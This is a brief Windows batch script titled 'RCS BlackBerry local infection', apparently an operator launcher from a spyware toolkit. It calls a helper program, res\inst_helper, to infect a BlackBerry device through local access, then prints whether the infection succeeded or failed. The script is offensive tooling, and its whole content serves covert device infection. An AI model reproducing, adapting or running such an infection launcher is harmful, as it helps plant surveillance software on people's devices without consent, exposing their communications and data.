@echo off

echo.
echo    **********************************
echo    * RCS BlackBerry local infection *
echo    **********************************
echo.

res\inst_helper interactive
IF %ERRORLEVEL% NEQ 0 GOTO failure

:success
echo.
echo Infection completed!
GOTO end

:failure
echo.
echo Infection failed!

:end
echo.
pause
